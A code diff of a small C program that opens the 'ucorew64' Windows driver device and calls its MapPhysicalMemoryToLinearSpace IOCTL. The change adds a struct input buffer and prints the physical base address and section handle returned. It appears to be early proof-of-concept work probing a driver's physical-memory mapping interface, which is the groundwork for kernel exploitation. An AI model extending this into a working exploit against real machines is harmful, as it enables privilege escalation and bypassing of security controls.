@@ -6,12 +6,21 @@
 #define UnmapPhysicalMemory 0xFA002EEC
 #define STATUS_SUCCESS 0x0
 
+struct struct_buffer
+{
+    void* SectionHandle;
+    DWORD offset;
+    unsigned int BusAddress;
+    PVOID PhysicalBaseAddress;
+};
+
+
 int main(char argc, char** argv)
 {
     HANDLE device = INVALID_HANDLE_VALUE;
     NTSTATUS status = FALSE;
     DWORD bytesReturned = 0;
-    CHAR inBuffer[64] = { 0 };
+    struct_buffer inBuffer = { 0 };
     CHAR outBuffer[64] = { 0 };
 
     device = CreateFileW(L"\\\\.\\ucorew64", GENERIC_ALL, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_SYSTEM, 0);
@@ -23,12 +32,15 @@ int main(char argc, char** argv)
     }
 
     printf("[ ] Calling MapPhysicalMemoryToLinearSpace 0x%X\n", MapPhysicalMemoryToLinearSpace);
-    status = DeviceIoControl(device, MapPhysicalMemoryToLinearSpace, inBuffer, sizeof(inBuffer), outBuffer, sizeof(outBuffer), &bytesReturned, (LPOVERLAPPED)NULL);
+    status = DeviceIoControl(device, MapPhysicalMemoryToLinearSpace, &inBuffer, sizeof(inBuffer), outBuffer, sizeof(outBuffer), &bytesReturned, (LPOVERLAPPED)NULL);
     if (status != STATUS_SUCCESS) {
         printf("[!] MapPhysicalMemoryToLinearSpace failed with %X\n", status);
     }
     printf("[*] MapPhysicalMemoryToLinearSpace 0x%X called successfully\n", MapPhysicalMemoryToLinearSpace);
     printf("[*] Buffer from the kernel land: %02X. Received buffer size: %d\n", outBuffer[0], bytesReturned);
+
+    printf("[*] inBuffer PhysicalBaseAddress: %p", inBuffer.PhysicalBaseAddress);
+    printf("[*] inBuffer SectionHandle: %p", inBuffer.SectionHandle);
 
     system("pause");
 
